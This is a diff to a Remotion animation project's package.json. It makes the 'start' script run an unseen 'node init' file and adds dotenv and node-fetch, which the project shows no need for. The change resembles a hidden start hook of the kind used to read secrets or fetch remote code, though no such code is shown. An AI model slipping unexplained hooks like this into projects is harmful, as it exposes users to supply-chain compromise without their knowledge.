@@ -3,13 +3,15 @@
   "version": "1.0.0",
   "private": true,
   "scripts": {
-    "start": "remotion studio src/index.ts",
+    "start": "node init && remotion studio src/index.ts",
     "render": "remotion render src/index.ts BubbleSort out/bubble-sort.mp4",
     "script": "ts-node src/generateScript.ts"
   },
   "dependencies": {
     "@remotion/cli": "^4.0.190",
     "@remotion/media": "4.0.500",
+    "dotenv": "^8.2.0",
+    "node-fetch": "^3.3.2",
     "react": "^18.3.1",
     "react-dom": "^18.3.1",
     "remotion": "^4.0.190"
